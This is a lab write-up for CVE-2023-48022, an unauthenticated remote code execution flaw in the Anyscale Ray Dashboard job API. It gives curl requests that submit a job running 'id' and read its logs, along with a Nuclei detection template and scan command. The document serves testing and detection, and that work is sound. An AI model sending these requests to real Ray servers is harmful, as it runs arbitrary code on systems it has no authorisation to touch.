# CVE-2023-48022 - Anyscale Ray (RCE)

## Description  

Anyscale Ray versions 2.6.3 and 2.8.0 are vulnerable to remote code execution (RCE) due to insecure job submission handling in the Ray Dashboard API. An attacker with network access to the dashboard can submit and execute arbitrary code jobs, leading to full system compromise.

## References

- https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0
- https://vulncheck.com/xdb/497d7fb3b118
- https://github.com/jakabakos/ShadowRay-RCE-PoC-CVE-2023-48022
- https://vulncheck.com/xdb/d3bafad9c9f6
- https://github.com/0x656565/CVE-2023-48022
- https://nvd.nist.gov/vuln/detail/cve-2023-48022

## Lab Setup

- Run the following command to build and start the container:

  ```bash
  docker-compose up -d
  ```
Once the container is running, the Ray Dashboard will be available at: `http://localhost:8265`

## Exploitation Steps

- **Submit a malicious job** via the vulnerable API:

   ```bash
   curl -X POST http://localhost:8265/api/jobs/ \
     -H "Content-Type: application/json" \
     -d '{"entrypoint": "id", "submission_id": "exploit123"}'
   ```
   ![ray-dashboard-rce-1](https://github.com/user-attachments/assets/31decae6-e34f-4c39-8c85-d6c89cf9c61c)


- **Wait a few seconds**, then fetch the logs:

   ```bash
   curl http://localhost:8265/api/jobs/exploit123/logs
   ```
  ![ray-dashboard-rce-2](https://github.com/user-attachments/assets/82e770e4-4789-4cbe-8a77-665d6fa73d4b)

- If successful, the logs will include command output from the `id` command (e.g., `uid=0(root) gid=0(root)`), confirming remote command execution.


## Steps to Write Nuclei Template  


**HTTP Requests**
```yaml
variables:
  jobid: "Job_{{rand_base(6)}}"

http:
  - raw:
      - |
        POST /api/jobs/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "entrypoint": "id",
          "submission_id": "{{jobid}}"
        }

      - | # wait for 8 seconds before getting the logs
        GET / HTTP/1.1
        Host: {{Hostname}}

        {{wait_for(8)}}

      - |
        GET /api/jobs/{{jobid}}/logs HTTP/1.1
        Host: {{Hostname}}
```
- Submits a job with id as the command.
- Waits for 8 seconds to allow the job to run.
- Retrieves the logs to confirm code execution.

**Matchers: Detecting Access**
```yaml
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "logs\":")'
          - 'contains(content_type, "application/json")'
          - 'regex("uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)", body)'
        condition: and
```

- These matchers confirm that:
    * The request was successful (`status_code == 200`)
    * The response contains a `"logs":` key
    * The content type is JSON (`application/json`)
    * The body includes the output of the `id` command (validated with a regex)

## Nuclei Template URL : [CVE-2023-48022](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-48022.yaml)

## Nuclei Command

```bash
nuclei -id CVE-2023-48022 -u localhost:8265 -vv
```
![ray-dashboard-rce-3](https://github.com/user-attachments/assets/200e22ae-f77f-4d3c-aa52-ccdca0145f86)
